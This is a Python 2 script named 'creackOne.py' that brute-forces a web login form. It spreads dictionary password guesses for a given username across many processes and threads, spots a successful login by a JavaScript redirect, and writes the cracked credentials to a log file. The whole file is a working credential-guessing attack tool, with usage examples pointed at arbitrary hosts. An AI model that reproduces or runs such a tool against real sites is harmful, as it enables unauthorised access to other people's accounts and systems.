from multiprocessing import Queue, Process
from multiprocessing.sharedctypes import Value
import argparse,urllib,urllib2,re
import base64
import datetime
import signal
import sys
import textwrap
import threading
import time

successfile = open('successfile.log', 'a')
counter = Value('i', 0)
# if found pass
iskeyfound = Value('b', False)

def crack(host, user,crequeue, recycledqueue, iskeyfound, counter, logqueue):
    site = "http://"+host
    while 1:
        if(iskeyfound.value):
            break
        if(not crequeue.empty()):
            comb = crequeue.get()
        elif(not recycledqueue.empty()):
            comb = recycledqueue.get()
        else:
            break
        para = urllib.urlencode({'username':user,'passwd':comb,'Submit_login':''})
        req = urllib2.Request(site)
        try:
            fd = urllib2.urlopen(req,para)
            data = fd.read()
            match = re.search('<script language="javascript">location.href', data)
            if match:
                if fd.getcode()== 200:
                    tmp_str = str('[+] success :host => %s, name => %s ,password => %s , code:%s' % (host,user,comb, fd.getcode()))
                    logqueue.put(tmp_str)
                    iskeyfound.value = True
                    successfile.write(tmp_str + "\n")
                    break
            else:
                logqueue.put('[-] tring %s :  %s  ,code:%s' % (user,comb, fd.getcode()))
        except urllib2.URLError as e:
            logqueue.put(("[-] catch error,reinput %s into queue. error reason:%s" % (comb, e)))
            recycledqueue.put(comb)
        except KeyboardInterrupt:
            print "exit..."            
        counter.value += 1


def getargs():
    parser = argparse.ArgumentParser(prog='creackOne.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\
    For Example:
    -----------------------------------------------------------------------------
    python creackOne.py --host 127.0.0.1:8080 --user admin -p 4 -t 4 -d I:/dict 
    python creackOne.py --host www.testorg.com --user admin -p 4 -t 4 -d I:/dict'''))
    parser.add_argument('--host', metavar='host', type=str, help=' the host of target,including port')
    parser.add_argument('--user', metavar='name', type=str, help=' the name you are to crack')
    parser.add_argument('-p', metavar='process', type=int, help=' The amount of processes that used to crack')
    parser.add_argument('-t', metavar='threads', type=int, help=' The amount of threads per process')
    parser.add_argument('-d', metavar='directory', type=str, help=' The directory of passworld files')
   
    if(len(sys.argv[1:]) / 2 != 5):
        sys.argv.append('-h')
    return parser.parse_args()


def CreateCredentials(crequeue):
    paramsargs = getargs()
    dictfiles = open(paramsargs.d,'r')
    for dictfile in dictfiles:
        line = dictfile.strip()
        if(line):
            crequeue.put(line)
    dictfiles.close()

def gethost(hostlist):
    paramsargs = getargs()
    port = paramsargs.port
    dictfiles = open(paramsargs.host,'r')
    for dictfile in dictfiles:
        line = dictfile.strip()
        if(line):
            hostlist.put("http://"+line+":"+port)
    dictfiles.close()

    
def task(host, user, crequeue, threadnum, recycledqueue, iskeyfound, counter, logqueue):
    mythreads = []
    try:
        for i in range(threadnum):
            t = threading.Thread(target=crack, args=(host, user, crequeue, recycledqueue, iskeyfound, counter, logqueue), )
            t.start()
            mythreads.append(t)
    
        for t in mythreads:
            t.join()
    except KeyboardInterrupt:
        print "exit..."
def printlog(logqueue):
    while 1:
        if(iskeyfound.value):
            break
        else:
            print(logqueue.get())
    

if __name__ == '__main__':
    paramsargs = getargs()
    maxProcesses = paramsargs.p
    threadnum = paramsargs.t
    host = paramsargs.host
    user = paramsargs.user
    recycledqueue = Queue()
    crequeue = Queue(maxsize=10000)
    logqueue = Queue()
    print('[+] start creaking .... ')
    starttime = datetime.datetime.now()
    threading.Thread(target=CreateCredentials, args=(crequeue,)).start()
    threading.Thread(target=printlog, args=(logqueue,)).start()
    cnProcesses = []
    for i in range(maxProcesses):
        cn = Process(target=task, args=(host,user, crequeue, threadnum, recycledqueue, iskeyfound, counter, logqueue))
        cn.start()
        cnProcesses.append(cn)
    for p in cnProcesses:
        p.join()
    counter = counter.value
    finishetime = datetime.datetime.now()
    ptime = finishetime - starttime
    print(str('[+] finished,i have guess %i password,use time %s\
                    ' % (counter, time.strftime('%H:%M:%S', time.gmtime(ptime.seconds)))))